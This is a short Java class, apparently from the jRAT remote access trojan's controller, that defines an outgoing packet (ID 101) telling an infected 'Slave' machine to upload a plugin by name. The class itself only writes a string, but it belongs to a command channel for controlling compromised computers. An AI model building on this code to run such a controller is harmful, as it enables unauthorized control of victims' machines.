package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;

public class Packet101UploadPlugin extends AbstractOutgoingPacket {
	
	private String name;
	
	public Packet101UploadPlugin(String name) {
		this.name = name;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(name);
	}

	@Override
	public short getPacketId() {
		return 101;
	}

}
